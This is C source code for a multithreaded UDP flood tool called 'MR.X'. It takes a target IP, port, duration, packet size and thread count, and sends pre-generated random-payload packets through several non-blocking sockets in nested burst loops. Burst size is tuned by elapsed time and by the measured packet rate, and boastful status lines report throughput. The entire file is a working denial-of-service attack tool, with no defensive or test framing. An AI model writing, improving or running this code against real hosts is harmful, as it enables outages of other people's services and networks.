#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>

#define BUFFER_ROTATION 5
#define PRE_ALLOC_COUNT 100000

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long current_pps = 0;
volatile unsigned long long total_bytes = 0;
pthread_t monitor_thread;
int monitor_running = 1;

char **packet_pool = NULL;

void print_k_format(unsigned long long value, char *buffer) {
    if (value < 1000) sprintf(buffer, "%llu", value);
    else if (value < 10000) sprintf(buffer, "%.1fK", value/1000.0);
    else if (value < 100000) sprintf(buffer, "%.1fK", value/1000.0);
    else if (value < 1000000) sprintf(buffer, "%.1fK", value/1000.0);
    else sprintf(buffer, "%.1fK", value/1000.0);
}

void init_packet_pool() {
    packet_pool = malloc(PRE_ALLOC_COUNT * sizeof(char*));
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        packet_pool[i] = malloc(PACKET_SIZE);
        for(int j = 0; j < PACKET_SIZE; j++) {
            packet_pool[i][j] = rand() % 256;
        }
        mlock(packet_pool[i], PACKET_SIZE);
    }
}

void cleanup_pool() {
    for(int i = 0; i < PRE_ALLOC_COUNT; i++) {
        if(packet_pool[i]) {
            munlock(packet_pool[i], PACKET_SIZE);
            free(packet_pool[i]);
        }
    }
    free(packet_pool);
}

void *pps_monitor(void *arg) {
    unsigned long long prev_count = 0;
    unsigned long long prev_bytes = 0;
    unsigned long long start_time = time(NULL);
    
    while (monitor_running) {
        sleep(1);
        unsigned long long current_count = total_packets;
        unsigned long long current_bytes = total_bytes;
        unsigned long long elapsed = time(NULL) - start_time;
        
        unsigned long long pps = current_count - prev_count;
        unsigned long long bps = (current_bytes - prev_bytes) * 8;
        double mbps = bps / 1000000.0;
        
        prev_count = current_count;
        prev_bytes = current_bytes;
        current_pps = pps;
        
        char total_str[20], pps_str[20];
        print_k_format(current_count, total_str);
        print_k_format(pps, pps_str);
        
        fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %.1f Mbps | %llus | X | 0 err\n",
                total_str, pps_str, mbps, elapsed);
        fflush(stderr);
    }
    return NULL;
}

void *send_ultra(void *arg) {
    int socks[BUFFER_ROTATION];
    struct sockaddr_in servaddr;
    time_t start_time = time(NULL);
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(TARGET_PORT);
    servaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        socks[s] = socket(AF_INET, SOCK_DGRAM, 0);
        int broadcast = 1;
        int sndbuf = 1000 * 1024 * 1024;
        setsockopt(socks[s], SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
        setsockopt(socks[s], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        setsockopt(socks[s], SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof(broadcast));
        fcntl(socks[s], F_SETFL, O_NONBLOCK);
    }
    
    int thread_id = (int)(long)arg;
    int local_pool_index = thread_id * 1500 % PRE_ALLOC_COUNT;
    int socket_rotate = 0;
    int instant_phase = 1;
    
    while (time(NULL) - start_time < DURATION_TIME) {
        time_t elapsed = time(NULL) - start_time;
        
        if (elapsed < 2 && instant_phase) {
            for (int instant = 0; instant < 3000; instant++) {
                int current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                for (int triple = 0; triple < 3; triple++) {
                    sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                           MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                    __sync_fetch_and_add(&total_packets, 1);
                    __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
                    local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                }
                socket_rotate++;
            }
            instant_phase = 0;
            continue;
        }
        
        int hyper_loops = 400;
        int inner_loops = 200;
        int extra_burst = 50;
        
        if (elapsed < 5) {
            hyper_loops = 500;
            inner_loops = 250;
            extra_burst = 60;
        } else if (elapsed < 30) {
            hyper_loops = 450;
            inner_loops = 225;
            extra_burst = 55;
        } else if (elapsed < 90) {
            hyper_loops = 420;
            inner_loops = 210;
            extra_burst = 52;
        } else if (elapsed < 180) {
            hyper_loops = 400;
            inner_loops = 200;
            extra_burst = 50;
        } else {
            hyper_loops = 380;
            inner_loops = 190;
            extra_burst = 48;
        }
        
        if (PACKET_SIZE <= 30) {
            hyper_loops = hyper_loops * 170 / 100;
            inner_loops = inner_loops * 170 / 100;
        }
        
        if (THREAD_COUNT < 100) {
            hyper_loops = hyper_loops * 120 / 100;
        }
        
        if (current_pps < 900000) {
            hyper_loops = hyper_loops * 112 / 100;
            inner_loops = inner_loops * 112 / 100;
        }
        
        if (current_pps > 1600000) {
            hyper_loops = hyper_loops * 90 / 100;
            inner_loops = inner_loops * 90 / 100;
        }
        
        for (int mega_burst = 0; mega_burst < hyper_loops; mega_burst++) {
            int current_sock = socks[socket_rotate % BUFFER_ROTATION];
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                   MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
            __sync_fetch_and_add(&total_packets, 1);
            __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
            local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
            socket_rotate++;
            
            for (int i = 0; i < inner_loops; i++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
            
            for (int extra = 0; extra < extra_burst; extra++) {
                current_sock = socks[socket_rotate % BUFFER_ROTATION];
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
                
                sendto(current_sock, packet_pool[local_pool_index], PACKET_SIZE,
                       MSG_DONTWAIT, (struct sockaddr *)&servaddr, sizeof(servaddr));
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, PACKET_SIZE);
                local_pool_index = (local_pool_index + 1) % PRE_ALLOC_COUNT;
                socket_rotate++;
            }
        }
    }
    
    for(int s = 0; s < BUFFER_ROTATION; s++) {
        close(socks[s]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx_best [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
        exit(EXIT_FAILURE);
    }

    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);

    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Error: Invalid values\n");
        exit(EXIT_FAILURE);
    }

    printf("MR.X 4X Power Started 🔥🔥🔥\n");
    fflush(stdout);
    
    srand(time(NULL));
    init_packet_pool();

    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);

    pthread_t *threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_ultra, (void*)(long)i);
        usleep(100);
    }

    sleep(DURATION_TIME);
    monitor_running = 0;
    
    for (int j = 0; j < THREAD_COUNT; j++) {
        pthread_cancel(threads[j]);
        pthread_join(threads[j], NULL);
    }

    pthread_join(monitor_thread, NULL);
    cleanup_pool();
    free(threads);
    
    unsigned long long avg_pps = total_packets / DURATION_TIME;
    unsigned long long avg_mbps = (total_bytes * 8) / (DURATION_TIME * 1000000.0);
    
    char total_str[20], pps_str[20];
    print_k_format(total_packets, total_str);
    print_k_format(avg_pps, pps_str);
    
    fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %llu Mbps | %ds | X | 0 err\n",
            total_str, pps_str, avg_mbps, DURATION_TIME);
    
    printf("MR.X Work Completed 🔥🔥🔥\n");
    fflush(stdout);

    return 0;
}